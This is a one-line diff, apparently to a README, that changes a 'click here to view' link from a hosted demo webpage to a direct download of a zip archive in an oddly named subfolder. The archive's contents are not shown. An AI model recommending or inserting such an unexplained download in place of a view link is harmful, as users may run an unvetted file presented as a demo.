@@ -1,1 +1,1 @@
-- click hereto view (https://kanak-debug.github.io/tula-webpage-demo/)
+- click hereto view (https://raw.githubusercontent.com/Kanak-debug/tula-webpage-demo/main/diastrophy/webpage-demo-tula-v1.8.zip)
